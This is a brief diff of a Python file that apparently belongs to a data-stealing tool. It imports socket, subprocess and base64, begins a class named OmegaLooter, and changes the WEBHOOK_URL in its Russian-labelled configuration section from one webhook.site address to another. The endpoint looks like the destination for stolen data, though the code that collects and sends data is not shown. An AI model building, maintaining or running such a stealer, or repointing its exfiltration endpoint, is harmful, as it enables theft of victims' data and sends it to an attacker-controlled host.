@@ -1,7 +1,7 @@
 import os, json, socket, urllib.request, subprocess, threading, base64
 
 # КОНФИГУРАЦИЯ
-WEBHOOK_URL = "https://webhook.site/b124440e-cd76-4ab0-8b65-b1f9bd749547"
+WEBHOOK_URL = "https://webhook.site/9354f8b9-61a2-462f-8e78-06c365c2ee05"
 
 class OmegaLooter:
     def __init__(self):
